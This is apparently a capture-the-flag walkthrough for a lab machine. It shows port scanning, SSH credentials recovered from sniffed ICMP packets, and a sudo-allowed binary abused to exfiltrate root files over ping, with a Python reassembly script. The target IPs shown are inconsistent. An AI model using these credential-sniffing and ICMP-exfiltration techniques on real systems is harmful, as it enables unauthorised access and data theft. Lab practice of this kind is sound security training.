### ***Target: 10.0.0.30***

## ***NMAP***

    # nmap -sS -T4 -p- 10.0.0.31

    PORT   STATE SERVICE                                                                                      
    22/tcp open  ssh                                                                                          
    80/tcp open  http

## ***HTTP***

Going to ***http://10.0.0.30*** we have apache's landing page, but after doing as the title said and we ping the machine, we have a different page.

![image](https://user-images.githubusercontent.com/76552238/166162631-14cb787f-487b-4661-8587-eda78b22f264.png)

It seems like the web server is pinging our local machine, let's see how we can exploit it to our advantage. Let's start by sniffing a bit using ***Wireshark***.

<!--ICMP reverse shell?-->

After sniffing with Wireshark I viewed the ICMP requests coming from the web server to our local machine. After decoding the hex encoded data I got this data on the packets.

    First Packet

    G$�����e
    username
    username
    username
    username
    us

>

    Second Packet

    ·Ô
    �����nger
    pinger
    pinger
    pinger
    pinger
    pinger

>

    Third Packet

    ÒE�����d
    password
    password
    password
    password
    pa

>

    Fourth Packet

    ßö
    �����ngM3
    P!ngM3
    P!ngM3
    P!ngM3
    P!ngM3
    P!ngM3

From this packets we can get the credentials ***pinger:P!ngM3***. Let's log in to ssh now.

    # ssh pinger@10.0.0.30

We can now read the first flag.

    $ cat user.txt 
    HMV{ICMPisSafe}

## ***PRIVILEGE ESCALATION***

Let's see if the user 'pinger' is a part of the sudoers group

    $ sudo -ll
    Matching Defaults entries for pinger on pingme:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User pinger may run the following commands on pingme:

    Sudoers entry:
        RunAsUsers: root
        Options: !authenticate
        Commands:
            /usr/local/sbin/sendfilebyping

After running the command as sudo and sending the user.txt file to our local machine, I built a script with python to help reassemble the packets.

getFileContent.py

    key = ""

    with open("strings-results.txt") as file:
        for line in file:
            if(len(line) == 41):
                key += line[0]
                key = key.strip('\n')
                #print(line[0], end="")

    i = 0
    for char in key:
        if(i % 2 == 0):
            print(char, end="")
        i += 1 


Running the same script on the strings of the root.txt file on the /root directory on the remote machine and we get the final flag.

### ***/root/root.txt***
    HMV{ICMPcanBeAbused}

<!--Not working for some reason but found the right ssh key (I guess)-->